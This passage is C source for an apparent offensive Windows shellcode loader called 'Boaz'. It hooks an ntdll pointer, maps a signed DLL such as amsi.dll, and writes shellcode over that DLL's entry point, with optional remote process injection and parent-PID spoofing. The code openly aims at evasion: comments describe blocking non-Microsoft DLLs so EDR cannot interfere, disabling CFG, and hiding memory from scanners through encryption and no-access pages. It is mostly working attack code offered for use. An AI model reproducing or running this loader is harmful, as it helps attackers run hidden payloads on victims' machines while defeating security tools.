          2f: 58                      pop    rax
          30: 41 5b                   pop    r11
          32: 41 5a                   pop    r10
          34: 41 59                   pop    r9
          36: 41 58                   pop    r8
          38: 5a                      pop    rdx
          39: 59                      pop    rcx
          3a: ff e0                   jmp    rax
*/

static unsigned char pretext[] = {
    0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB8, 
    0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0xBB, 0x22, 0x33, 
    0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0x48, 0x89, 0x03, 0x50, 0x48, 0x83, 0xEC, 
    0x40, 0xE8, 0x11, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x58, 0x41, 0x5B, 
    0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0xFF, 0xE0
};

void PatchPretext(DWORD_PTR originalVtPtrValue, BYTE *pHookAddr) {
    // Offset of placeholders in the pretext array
    size_t offsetOrigReference = 0x0C;  // Offset for 0x1122334455667788
    size_t offsetHookAddr = 0x16;       // Offset for 0x9988776655443322

    printf("Before Patching:\n");
    for (size_t i = 0; i < sizeof(pretext); ++i) {
        printf("%02X ", pretext[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("\n");

    // Replace 0x1122334455667788 with originalVtPtrValue
    memcpy(&pretext[offsetOrigReference], &originalVtPtrValue, sizeof(originalVtPtrValue));

    // Replace 0x9988776655443322 with pHookAddr
    memcpy(&pretext[offsetHookAddr], &pHookAddr, sizeof(pHookAddr));

    printf("After Patching:\n");
    for (size_t i = 0; i < sizeof(pretext); ++i) {
        printf("%02X ", pretext[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("\n");

    printf("Patched Values:\n");
    printf("originalVtPtrValue: 0x%016llX\n", (unsigned long long)originalVtPtrValue);
    printf("pHookAddr: 0x%016llX\n", (unsigned long long)pHookAddr);
}




int main(int argc, char *argv[])
{
    printf("[+] Starting Boaz custom loader...\n");
    // if (!EnableWindowsPrivilege(L"SeDebugPrivilege")) {
    //     printf("[-]Failed to enable SeDebugPrivilege. You might not have sufficient permissions.\n");
    //     return -1;
    // } else {
    //     printf("[+] SeDebugPrivilege enabled.\n");
    // }

    // Get the VT ptr based on the arch, win10/server and Win11 has different opcode in ntdll.dll
    BYTE *pModuleBase = NULL;
    pModuleBase = (BYTE*)GetNtdllBase();
    pHookAddr = findVTPointer(pModuleBase);

    originalVtPtrValue = *(DWORD_PTR*)pHookAddr;

    // patch the original VT ptr in the pretext code, so that execution flow will return to the original function 
    // after our magic code is executed.
    PatchPretext(originalVtPtrValue, pHookAddr);


    // All before anything else, we need the magic code size to start with: 
    SIZE_T magicSizeB2 = sizeof(magiccode);
    SIZE_T sizePretext = sizeof(pretext);

    // Combined array size
    SIZE_T magiccodeSize = magicSizeB2 + sizePretext;

    // method 1:
    // unsigned char magiccode[magiccodeSize];
    // memcpy(magiccode_nier, pretext, sizePretext);
    // memcpy(magiccode_nier + sizePretext, magiccode, magicSizeB2);

    // method 2:
    unsigned char *magiccode_nier = (unsigned char *)malloc(magiccodeSize);
    if (magiccode_nier == NULL) {
        perror("malloc failed");
        return EXIT_FAILURE;
    }

    // Copy the contents of pretext and magiccode into magiccode
    memcpy(magiccode_nier, pretext, sizePretext);
    memcpy(magiccode_nier + sizePretext, magiccode, magicSizeB2);

    // Print the combined array (for demonstration)
    // printf("Combined Shellcode:\n");
    // for (SIZE_T i = 0; i < magiccodeSize; i++) {
    //     printf("0x%02X, ", magiccode_nier[i]);
    //     if ((i + 1) % 16 == 0) printf("\n");
    // }
    //printf the size:
    printf("[+] Combined Shellcode Size: %zu bytes\n", magiccodeSize);




    // Default value for bTxF
    BOOL bTxF = FALSE, bUseCustomDLL = FALSE; // Flag to indicate whether to search for a suitable DLL
    int dllOrder = 1; // Default to the first suitable DLL

    BOOL bUseLdrLoadDll = FALSE; // Default to FALSE
    BOOL bUseDotnet = FALSE; // Default to FALSE
    BOOL bUseAddPebList = FALSE; // Default to FALSE
    ULONG_PTR ppid = 0; // Initialize ppid
    BOOL bPpid = FALSE; // Default to FALSE

    // Add new option to enable remote injection
    // Remote injection not support LdrLoadDll at the moment, it can be added later by 
    // executing this command with createRemoteThread triggered by callback function.
    BOOL bRemoteInjection = FALSE; // Default to FALSE
    //TODO: 


    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0) {
            PrintUsageAndExit();
            return 0; 
        }
        
        if (i + 1 < argc && strcmp(argv[i], "-dll") == 0) {
            dllOrder = atoi(argv[i + 1]);
            bUseCustomDLL = TRUE;
            i++; // Skip next argument as it's already processed
        } else if (strcmp(argv[i], "-txf") == 0) {
            bTxF = TRUE;
        } else if (strcmp(argv[i], "-thread") == 0) {
            bUseRtlCreateUserThread = TRUE;
        } else if (strcmp(argv[i], "-pool") == 0) {
            bUseCreateThreadpoolWait = TRUE;
        } else if (strcmp(argv[i], "-ldr") == 0) {
            bUseLdrLoadDll = TRUE;
        } else if (strcmp(argv[i], "-peb") == 0) {
            bUseAddPebList = TRUE;
        } else if (strcmp(argv[i], "-remote") == 0) {
            bRemoteInjection = TRUE;
        } else if (i + 1 < argc && strcmp(argv[i], "-ppid") == 0) {
            // Parse the next argument as an integer for ppid
            ppid = atoi(argv[i + 1]);  // Convert string to integer
            if (ppid <= 0) {
                printf("[-] Invalid PID: %s\n", argv[i + 1]);
                return 1;
            } else {
                printf("[+] Parent PID: %lu\n", ppid);
            }
            bPpid = TRUE;
            i++; // Skip next argument as it's already processed
        } else if (strcmp(argv[i], "-dotnet") == 0) {
            if(bUseCustomDLL) {
                bUseDotnet = TRUE;
            } else {
                printf("[-] -dotnet flag can only be used after -dll flag. Exiting.\n");
                return 1;
            }
        } else if (strcmp(argv[i], "-a") == 0) {
            bUseNoAccess = TRUE;
        } else {
            printf("[-] Invalid argument: %s\n", argv[i]);
            return 1;
        }

        // Check for mutual exclusivity early
        if (bUseCreateThreadpoolWait && bUseRtlCreateUserThread) {
            printf("[-] Both -thread and -pool flags cannot be used together. Exiting.\n");
            return 1;
        }
    }


    if(bUseCreateThreadpoolWait) {
        printf("[+] Using CreateThreadpoolWait function for APC write.\n");
    } else {
        // print whether use alternative thread calling function, printf which method will be used:
        printf("[+] Using %s thread calling function.\n", bUseRtlCreateUserThread ? "RtlCreateUserThread" : "NtCreateThreadEx for APC write.");
    }

    // Display debug message about transaction mode
    printf("[+] Transaction Mode: %s\n", bTxF ? "Enabled" : "Disabled");

    if (bUseNoAccess) {
        printf("[+] No access mode enabled to evade memory scanner.\n");
    }

    LoadNtFunctions(); // Load the NT functions

    wchar_t dllPath[MAX_PATH] = {0}; // Buffer to store the path of the chosen DLL

    // bool useDotnet = TRUE; //This option can be made available to commandline options TODO: 
    if (bUseCustomDLL) {
        DWORD requiredSize = sizeof(magiccode_nier); // Calculate the required size based on the magiccode array size
        printf("[+] Required size: %lu bytes\n", requiredSize);

        // Attempt to find a suitable DLL, now passing the calculated requiredSize
        if (!FindSuitableDLL(dllPath, sizeof(dllPath) / sizeof(wchar_t), requiredSize, bTxF, dllOrder, bUseDotnet)) {
            wprintf(L"[-] No suitable DLL found in the specified order. Falling back to default.\n");
            wcscpy_s(dllPath, L"C:\\windows\\system32\\amsi.dll"); // Default to amsi.dll
        } else {
            // wprintf(L"Using DLL: %s\n", dllPath);
        }
    } else {
        printf("[-] No custom DLL specified. Falling back to amsi.dll.\n");
        wcscpy_s(dllPath, L"C:\\windows\\system32\\amsi.dll"); // Use the default amsi.dll
    }

    wprintf(L"[+] Using DLL: %ls\n", dllPath);
    wprintf(L"[+] TxF Mode: %ls\n", bTxF ? L"Enabled" : L"Disabled");


    BOOL success = block_dlls_local();

    if(!success) {
        printf("[-] Failed to block DLLs. Exiting.\n");
        return 1;
    } else {
        printf("[+] NON-MICROSOFT SIGNED DLLs BLOCKED SUCCESSFULLY.\n");
    }

    // HANDLE hProcess = NULL; 
    // check bRemoteInjection
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    /// ACG, and PPID: 
        /// Enable block policy can prevent E.D.R from fiddle with our process
    STARTUPINFOEXA SI;
    ZeroMemory(&SI, sizeof(SI));
    SI.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    SI.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
	HANDLE parentProc = NULL;
    // set up blocking policy. 
    // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute

	DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON;
	// DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY2_MODULE_TAMPERING_PROTECTION_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_DEP_ATL_THUNK_ENABLE + PROCESS_CREATION_MITIGATION_POLICY_SEHOP_ENABLE + PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_REMOTE_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_LOW_LABEL_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_ON
    // + PROCESS_CREATION_MITIGATION_POLICY2_STRICT_CONTROL_FLOW_GUARD_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY2_CET_USER_SHADOW_STACKS_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY2_USER_CET_SET_CONTEXT_IP_VALIDATION_ALWAYS_ON;
    // DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY2_MODULE_TAMPERING_PROTECTION_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_SEHOP_ENABLE + PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_REMOTE_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_LOW_LABEL_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_ON;
    // PROCESS_CREATION_MITIGATION_POLICY_FORCE_RELOCATE_IMAGES_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_STRICT_HANDLE_CHECKS_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_HIGH_ENTROPY_ASLR_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_ON

	// Initializing OBJECT_ATTRIBUTES and CLIENT_ID struct
	OBJECT_ATTRIBUTES pObjectAttributes;
	InitializeObjectAttributes(&pObjectAttributes, NULL, 0, NULL, NULL);
	CLIENT_ID pClientId;
	pClientId.UniqueProcess = (PVOID)ppid;
	pClientId.UniqueThread = (PVOID)0;

    if(bPpid) {
        NTSTATUS sTart = NtOpenFuture(&parentProc, PROCESS_CREATE_PROCESS, &pObjectAttributes, &pClientId);

        if(sTart != STATUS_SUCCESS) {
            printf("[-] Failed to open parent process. Error: 0x%X\n", sTart);
            return 1;
        } else {
            printf("[+] Parent process opened successfully.\n");
        }

        // Get the size of our PROC_THREAD_ATTRIBUTE_LIST to be allocated
        SIZE_T size = 0;
        InitializeProcThreadAttributeList(NULL, 2, 0, &size);

        // Allocate memory for PROC_THREAD_ATTRIBUTE_LIST
        SI.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);

        // Initialise our list 
        InitializeProcThreadAttributeList(SI.lpAttributeList, 2, 0, &size);

        // Assign parent pid attribute to attribute list
        UpdateProcThreadAttribute(SI.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProc, sizeof(HANDLE), NULL, NULL);

        // Assign mitigation policies to new process include dynamic code guard, and block non-microsoft binaries, etc.
        UpdateProcThreadAttribute(SI.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(HANDLE), NULL, NULL);
        /// MP, and PPID: 
    }

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    DWORD pid = 0;
    char notepadPath[256] = {0};  // Initialize the buffer
    if(bRemoteInjection) {

        // Get the process ID from the user
        printf("Enter the process ID: ");
        char input[MAX_INPUT_SIZE];

        
        // Use fgets to get the input, allowing for empty input (pressing Enter)
        if (fgets(input, MAX_INPUT_SIZE, stdin) != NULL) {
            // Remove the trailing newline character from the input
            input[strcspn(input, "\n")] = 0;

            // Check if the input is empty (user just pressed Enter) or invalid (non-numeric)
            if (strlen(input) == 0 || sscanf(input, "%d", &pid) != 1) {
                // If empty input or invalid input (non-numeric), launch Notepad
                printf("[-] Invalid or no PID provided. Starting Notepad...\n");

                // Determine the correct Notepad path based on system architecture
                if (IsSystem64Bit()) {
                    strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
                    // strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\RuntimeBroker.exe");
                } else {
                    strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
                }

                // PPID: 
                if(!bPpid) {
                    // Attempt to create Notepad process
                    if (CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                        printf("[+] Notepad started with PID: %d\n", pi.dwProcessId);
                        hProcess = pi.hProcess;  // Store Notepad handle
                    } else {
                        MessageBox(NULL, "Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
                        return 1;
                    }
                } else {
                    // Attempt to create Notepad process
                    if (CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &SI.StartupInfo, &pi)) {
                        printf("[+] Secured Notepad started with PID: %d\n", pi.dwProcessId);
                        hProcess = pi.hProcess;  // Store Notepad handle
                    } else {
                        MessageBox(NULL, "Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
                        return 1;
                    }
                }

            } else {
                // Valid PID input, try to open the process
                hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
                if (hProcess == NULL) {
                    printf("[-] Failed to open process with PID: %d\n", pid);
                    return 1;
                } else {
                    printf("[+] Opened process with PID: %d\n", pid);
                }
            }
        }

    } else {
        // If bRemoteInjection is FALSE, we open the current process
        printf("[*] bRemoteInjection is FALSE. Opening current process.\n");
        hProcess = GetCurrentProcess();
    }

    ///printf hProcess:
    printf("[+] hProcess: %p\n", hProcess);
    // print process ID:
    printf("[+] Process ID: %d\n", GetProcessId(hProcess));


    /// deal with TxF argument
    HANDLE fileHandle;
    if (bTxF) {
        OBJECT_ATTRIBUTES ObjAttr = { sizeof(OBJECT_ATTRIBUTES) };
        HANDLE hTransaction;
        NTSTATUS NtStatus = NtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &ObjAttr, nullptr, nullptr, 0, 0, 0, nullptr, nullptr);
        if (!NT_SUCCESS(NtStatus)) {
            printf("[-] Failed to create transaction (error 0x%x)\n", NtStatus);
            return 1;
        }

        // Display debug message about creating transaction
        printf("[+] Transaction created successfully.\n");
        
        fileHandle = CreateFileTransactedW(dllPath, GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr, hTransaction, nullptr, nullptr);
        // fileHandle = CreateFileTransactedW(dllPath, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr, hTransaction, nullptr, nullptr);
        if (fileHandle == INVALID_HANDLE_VALUE) {
            printf("[-] Failed to open DLL file transacted. Error: %lu\n", GetLastError());
            CloseHandle(hTransaction);
            return 1;
        }

        // Display debug message about opening DLL file transacted
        printf("[+] DLL file opened transacted successfully.\n");
    } else {
        fileHandle = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (fileHandle == INVALID_HANDLE_VALUE) {
            printf("[-] Failed to open DLL file. Error: %lu\n", GetLastError());
            return 1;
        }

        // Display debug message about opening DLL file
        printf("[+] DLL file opened successfully.\n");
    }

    LONG status = 0;
    HANDLE fileBase = NULL;
    HANDLE fileBaseRemote = NULL;
    HANDLE hSection = NULL;
    HANDLE hSectionRemote = NULL;
    SIZE_T viewSize = 0;
    if(bUseLdrLoadDll) {
        printf("[+] Using LdrLoadDll function.\n");

        UNICODE_STRING UnicodeDllPath;
        ManualInitUnicodeString(&UnicodeDllPath, dllPath);
        NTSTATUS status = LdrLoadDll(NULL, 0, &UnicodeDllPath, &fileBase);  // Load the DLL

        if (NT_SUCCESS(status)) {
            printf("[!] LdrLoadDll loaded successfully.\n");
        } else {
            printf("[-] LdrLoadDll failed. Status: %x\n", status);
        }
    } else {

        printf("[+] Using mapped DLL with missing PEB (NtCreateSection and NtMapViewOfSection).\n");
        // Create a section from the file
        // LONG status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, fileHandle);
        // LONG status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, 0x40, 0x08000000, fileHandle);
        status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, fileHandle);
        if (status != 0) {
            printf("NtCreateSection failed. Status: %x\n", status);
            CloseHandle(fileHandle);
            return 1;
        }

        // Map the section into the process
        // PVOID fileBase = NULL;
        status = NtMapViewOfSection(hSection, GetCurrentProcess(), (PVOID*)&fileBase, 0, 0, NULL, &viewSize, 2, 0, 0x04);
        // status = NtMapViewOfSection(hSection, GetCurrentProcess(), (PVOID*)&fileBase, 0, 0, NULL, &viewSize, 1, 0, PAGE_READWRITE);
        if (status != 0) {
            printf("NtMapViewOfSection failed. Status: %x\n", status);
            CloseHandle(hSection);
            CloseHandle(fileHandle);
            return 1;
        } else {
            printf("[+] Section mapped successfully.\n");
            //print fileBase:
            printf("[+] fileBase: %p\n", fileBase);
            //print view size:
            printf("[+] viewSize: %lu\n", viewSize);
        }

        if(bRemoteInjection) {
            status = NtMapViewOfSection(hSection, hProcess, (PVOID*)&fileBaseRemote, 0, 0, NULL, &viewSize, 2, 0, 0x20);
            // status = NtMapViewOfSection(hSection, hProcess, (PVOID*)&fileBaseRemote, 0, 0, NULL, &viewSize, 1, 0, PAGE_READWRITE);
            if (status != 0) {
                printf("NtMapViewOfSection failed. Status: %x\n", status);
                CloseHandle(hSectionRemote);
                CloseHandle(fileHandle);
                return 1;
            } else {
                printf("[+] Section mapped to remote process successfully.\n");
                //print fileBaseRemote:
                printf("[+] fileBaseRemote: %p\n", fileBaseRemote);
                printf("[+] viewSize: %lu\n", viewSize);
            }

        }

        // status = NtUnmapViewOfSection(GetCurrentProcess(), fileBase);
        // if(status != 0) {
        //     printf("NtUnmapViewOfSection failed. Status: %x\n", status);
        //     return 1;
        // } else {
        //     printf("[+] Local Process section unmapped successfully.\n");
        // }
        printf("[+] press any key to continue\n");
        getchar();
    }


    printf("[!] Before add our module to the PEB lists. \n");
    printf("[!] press any key to continue\n");
    getchar();
    if(!bUseLdrLoadDll) {
        if(bUseAddPebList) {
            const wchar_t* dllName = GetDllNameFromPath(dllPath);

            bool bAddModuleToPEB = AddModuleToPEB((PBYTE)fileBase, dllPath, (LPWSTR)dllName, (ULONG_PTR)fileBase);
            if(bAddModuleToPEB) {
                printf("[+] AddModuleToPEB succeeded\n");
                wprintf(L"DLL %ls added to PEB lists\n", dllPath);
            } else {
                printf("[-] AddModuleToPEB failed\n");
            }
        }
    }
    printf("[!] press any key to continue\n");
    getchar();


    // find the DLL entrypoint
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBase;
    printf("[+] DOS header: %p\n", dosHeader);
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader->e_lfanew);

    if(bRemoteInjection) {
        dosHeader = (PIMAGE_DOS_HEADER)malloc(sizeof(IMAGE_DOS_HEADER));
        if (!ReadProcessMemory(hProcess, (LPCVOID)fileBaseRemote, dosHeader, sizeof(IMAGE_DOS_HEADER), NULL)) {
            printf("Failed to read DOS header. Error: %x\n", GetLastError());
            return 1;
        }
        printf("[+] DOS header read successfully from remote process: %p\n", dosHeader);

        PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)malloc(sizeof(IMAGE_NT_HEADERS));
        if (!ReadProcessMemory(hProcess, (LPCVOID)((DWORD_PTR)fileBaseRemote + dosHeader->e_lfanew), ntHeader, sizeof(IMAGE_NT_HEADERS), NULL)) {
            printf("Failed to read NT header. Error: %x\n", GetLastError());
            return 1;
        }
        printf("[+] NT header read successfully from remote process: %p\n", ntHeader);
    }


    DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;
    printf("[+] Entry point RVA: %p\n", entryPointRVA);

    // Size of the DLL in memory
    SIZE_T dllSize = ntHeader->OptionalHeader.SizeOfImage;
    printf("[+] DLL size: %lu\n", dllSize);

    dllEntryPoint = NULL;
    if(bRemoteInjection) {
        dllEntryPoint = (PVOID)((DWORD_PTR)fileBaseRemote + entryPointRVA);
    } else {
        dllEntryPoint = (PVOID)((DWORD_PTR)fileBase + entryPointRVA);
    }
	printf("[+] Remote DLL entry point: %p\n", dllEntryPoint);

    ///////////////////////////// Let's get the memory protection of the target DLL's entry point before any modification: 
    /// The .text section should already be read execute: 
    
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T result;

    result = VirtualQueryEx(hProcess, dllEntryPoint, &mbi, sizeof(mbi));

    if (result == 0) {
        printf("VirtualQueryEx failed. Error: %lu\n", GetLastError());
    } else {
        printf("[+] Default memory protection in target DLL is: %s\n", ProtectionToString(mbi.Protect));
    }

    // printf("[**] magiccode_nierSize: %lu\n", magiccodeSize);

    // printf("[*] dllEntryPoint: %p\n", dllEntryPoint);


    PVOID baseAddress = dllEntryPoint; // BaseAddress must be a pointer to the start of the memory region
    regionSize = magiccodeSize; // The size of the region
    ULONG oldProtect;


    DLLEntry DllEntry1 = (DLLEntry)(dllEntryPoint);
    // (*DllEntry1)((HINSTANCE)fileBase, DLL_PROCESS_ATTACH, 0);
    DllEntryGlobal = DllEntry1;
    fileBaseGlobal = fileBase;

    /* Change memeory protection to read and write */
    status = NtProtectVirtualMemory(
        hProcess,
        &baseAddress, // NtProtectVirtualMemory expects a pointer to the base address
        &regionSize, // A pointer to the size of the region
        PAGE_READWRITE, // The new protection attributes 
        &oldProtect); // The old protection attributes

    if(status != STATUS_SUCCESS) {
        printf("[-] NtProtectVirtualMemory failed to change memory protection. Status: %x\n", status);
        return 1;
    } else {
        printf("[+] Memory protection after before was: %s\n", ProtectionToString(oldProtect));
    }
    // printf("[+] Default memory protection before change in target DLL was: %s\n", ProtectionToString(oldProtect));

    if (hProcess != NULL) {
        result = WriteProcessMemoryAPC(hProcess, (BYTE*)dllEntryPoint, (BYTE*)magiccode_nier, magiccodeSize, bUseRtlCreateUserThread, bUseCreateThreadpoolWait); 
    }


    // the magicode can be freed: 
    free(magiccode_nier);
    magiccode_nier = NULL;


    //####END####



    if(bRemoteInjection) {


        /* if -a flag is supplied, the code snippet below will not be used. */
        if(!bUseNoAccess) {
            SIZE_T pageSize = 4096;  // 4 KB page size
            uintptr_t basePlace = (uintptr_t)dllEntryPoint + magiccodeSize;

            // // Align the address to the next page boundary
            uintptr_t alignedAddress = (basePlace + pageSize - 1) & ~(pageSize - 1);

            // printf("[+] Aligned address: %p\n", alignedAddress);

            totalSize = (alignedAddress - (uintptr_t)dllEntryPoint) + sizeof(trampCodeBuff);

            printf("[+] Total size of the region: %zu bytes\n", totalSize);

            // Proceed with memory protection and writing
            opCodeAddress = (LPVOID)alignedAddress;
            // sort the alignment of the address:

            // // print dllEntryPoint:
            // printf("[+] dllEntryPoint: %p\n", dllEntryPoint);
            // // print opCodeAddress:
            // printf("[+] opCodeAddress: %p\n", opCodeAddress);

            SIZE_T size = sizeof(trampCodeBuff);
            printf("The size of trampCodeBuff is: %zu bytes\n", size);
            // Get the address of the hooked_function
            uintptr_t functionAddress; 

            functionAddress = (uintptr_t)DllEntryGlobal;

            // Copy the address into the trampCodeBuff
            memcpy(&trampCodeBuff[POINTER_OFFSET], &functionAddress, sizeof(functionAddress));

            originalVtPtrValue = *(DWORD_PTR*)pHookAddr;
            memcpy(&trampCodeBuff[RETURN_ADDRESS_OFFSET], &originalVtPtrValue, sizeof(originalVtPtrValue));
            //print the content of trampCodeBuff: 
            // printf("[+] trampCodeBuff: ");
            // for (int i = 0; i < size + 1; i++) {
            //     printf("%02x", trampCodeBuff[i]);
            // }
            // printf("\r\n");


            // Apply patch guard CFG: 
            patchCFG(hProcess);
            printf("[+] CFG guard disabled.\n");
            printf("[+] press any key to continue\n");
            getchar();


            status = NtProtectVirtualMemory(
                hProcess,
                &opCodeAddress,
                &size,
                PAGE_READWRITE,
                &oldProtect
            );
            if(status != STATUS_SUCCESS) {
                printf("[-] NtProtectVirtualMemory failed to change memory protection. Status: %x\n", status);
                return 1;
            } else {
                printf("[+] Memory protection before was: %s\n", ProtectionToString(oldProtect));
            }

            // opCodeAddress = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            // if(opCodeAddress == NULL) {
            //     printf("[-] Failed to allocate memory in the target process. Error: %lu\n", GetLastError());
            //     return -1;
            // } else {
            //     printf("[+] Memory successfully allocated in the target process.\n");
            //     //print the allocated memory address:
            //     printf("[+] opCodeAddress: %p\n", opCodeAddress);
            //     printf("[+] press any key to continue\n");
            //     getchar();
            // }

            // Check the memory at the specific address
            MEMORY_BASIC_INFORMATION mbi;
            SIZE_T result = VirtualQueryEx(hProcess, opCodeAddress, &mbi, sizeof(mbi));

            if (result == 0) {
                printf("[-] Failed to query memory. Error: %lx\n", GetLastError());
                return 1;
            }

            // Check if the memory is already committed or reserved
            if (mbi.State != MEM_FREE) {
                printf("[-] Memory at address %p is not free. State: %lx\n", opCodeAddress, mbi.State);
            }
            // After changing memory protection, just check if the memory is committed
            if (mbi.State == MEM_COMMIT) {
                printf("[+] Memory at address %p is committed and ready for writing.\n", opCodeAddress);
            } else {
                printf("[-] Memory at address %p is not committed. State: %lx\n", opCodeAddress, mbi.State);
            }


            SIZE_T bytesWritten;
            if (!WriteProcessMemory(
                    hProcess,           // Handle to the target process
                    opCodeAddress,      // Address in the target process where the buffer will be written
                    trampCodeBuff,       // Pointer to the buffer with the opcode
                    size,       // Size of the buffer
                    &bytesWritten                // Optionally, receive the number of bytes written
                )) {
                VirtualFreeEx(hProcess, opCodeAddress, 0, MEM_RELEASE);  // Free the allocated memory
                return -1;
                printf("[-] Failed to write the opcode buffer to the target process. Error: %lu\n", GetLastError());
            } else {
                printf("[+] Opcode buffer successfully written to the target process.\n");
                printf("[+] bytesWritten: %zu\n", bytesWritten);
                printf("[+] press any key to continue\n");
                getchar();
            }

            /// write to opCodeAddress using      WriteProcessMemoryAPC: 
            // result = WriteProcessMemoryAPC(hProcess, (BYTE*)opCodeAddress, (BYTE*)trampCodeBuff, size, bUseRtlCreateUserThread, bUseCreateThreadpoolWait);
            // if(result) {
            //     printf("[+] Opcode buffer successfully written to the target process.\n");
            // } else {
            //     printf("[-] Failed to write the opcode buffer to the target process. Error: %lu\n", GetLastError());
            //     // exit
            //     return -1;
            // }

            /* functions below to verify */
            // BYTE readBackBuffer[sizeof(trampCodeBuff)];
            // if (!ReadProcessMemory(hProcess, (LPCVOID)opCodeAddress, &readBackBuffer, sizeof(readBackBuffer), NULL)) {
            //     printf("[-] Failed to read back memory at opCodeAddress in remote process. Error: %lu\n", GetLastError());
            //     return -1;
            // }

            // // Compare the buffer
            // if (memcmp(trampCodeBuff, readBackBuffer, sizeof(trampCodeBuff)) == 0) {
            //     printf("[+] trampCodeBuff successfully written and verified in the remote process.\n");
            // } else {
            //     printf("[-] Mismatch in written data at opCodeAddress in remote process.\n");
            // }


            /// restore the memory protection of opCodeAddress to PAGE_EXECUTEREAD:
            status = NtProtectVirtualMemory(
                hProcess,
                &opCodeAddress,
                &pageSize,
                PAGE_EXECUTE_READ,
                &oldProtect
            );
            if(status != STATUS_SUCCESS) {
                printf("[-] NtProtectVirtualMemory failed to change memory protection. Status: %x\n", status);
                return 1;
            } else {
                printf("[+] Memory protection before was: %s\n", ProtectionToString(oldProtect));
            }


        }
        
    } 



    if (result) {
        printf("Failed to APC write magiccode. Error: %lu\n", GetLastError());
        // return 1;
    } else {
		printf("[+] Magic code written with APC write.\n");
        printf("[+] press any key to continue\n");
        getchar();
        // SimpleSleep(10000);
	}


    /// Code for local process execution and page_no_access memeory guard enabled. 
    if(bUseNoAccess && !bRemoteInjection) {
        // make it disappear with sys func 32: 
        const char sysfunc32Char[] = { 'S', 'y', 's', 't', 'e', 'm', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', '0', '3', '2', 0 };
        initialize_keys();
        initialize_data((char*)dllEntryPoint, magiccodeSize); 
        sysfunc32 = (SystemFunction032_t)GetProcAddress(LoadLibrary("advapi32.dll"), sysfunc32Char);
